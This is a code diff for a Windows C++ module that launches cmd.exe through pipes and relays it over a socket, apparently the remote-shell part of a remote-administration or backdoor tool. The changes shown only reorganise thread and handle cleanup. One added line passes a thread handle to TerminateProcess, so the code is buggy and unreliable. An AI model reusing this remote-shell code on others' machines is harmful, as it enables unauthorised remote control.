@@ -22,8 +22,7 @@ SOCKET MainSocket;
 	HANDLE hWirteConsoleThread;
 	HANDLE hReadConsoleThread;
 
-// char *pWriteBuffer = new char[10000];
-//char	*pReadBuffer = new  char [10000];
+
 	int End;
 
 DWORD __stdcall CmdManageThread(LPVOID lparam)//线程处理Cmd 传输
@@ -104,8 +103,6 @@ DWORD __stdcall CmdManageThread(LPVOID lparam)//线程处理Cmd 传输
 	GetSystemDirectoryA(strShellPath, MAX_PATH);
 	
 	strcat(strShellPath,"\\cmd.exe");
-	
-	
  
 
 	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
@@ -132,7 +129,14 @@ DWORD __stdcall CmdManageThread(LPVOID lparam)//线程处理Cmd 传输
  
 
 
-
+	HANDLE hThread[2];
+	hThread[0] = hWirteConsoleThread;
+	hThread[1] =hReadConsoleThread;
+	WaitForMultipleObjects(2, hThread, FALSE, INFINITE);
+	TerminateThread(hWirteConsoleThread, 0);
+	TerminateProcess(hReadConsoleThread, 1);
+	CloseHandle(pi.hProcess); 
+	CloseHandle(pi.hThread);
 	return 0;
  
  
@@ -160,7 +164,7 @@ DWORD __stdcall CmdManageThread(LPVOID lparam)//线程处理Cmd 传输
 		  
 		  if(msg.dwCmd == 88)
 		  {
-			    
+			     
 				Clear();
 				if(pWriteBuffer != NULL) delete pWriteBuffer;
 				TerminateProcess(hProcess, 1);	
@@ -214,16 +218,20 @@ DWORD __stdcall CmdManageThread(LPVOID lparam)//线程处理Cmd 传输
 
 void Clear()
 {
- 
+		/*	TerminateProcess(hWirteConsoleThread,1);
+			TerminateProcess(hReadConsoleThread, 1);
 	        closesocket(MainSocket);
 			CloseHandle( m_hReadPipeHandle);
 			CloseHandle( m_hWritePipeHandle); 
 			CloseHandle( m_hWritePipeShell);
 			CloseHandle( m_hReadPipeShell);
+			CloseHandle( hWirteConsoleThread); 
+			CloseHandle(hReadConsoleThread);	
+			//WaitForSingleObject( m_hProcessHandle, INFINITE );
 			CloseHandle( m_hProcessHandle); 
 			CloseHandle( m_hThreadHandle);
-			CloseHandle( hWirteConsoleThread); 
-			CloseHandle(hReadConsoleThread);
+			TerminateProcess(m_hProcessHandle, 1);	
+			*/
 		    End = 1;
 
 
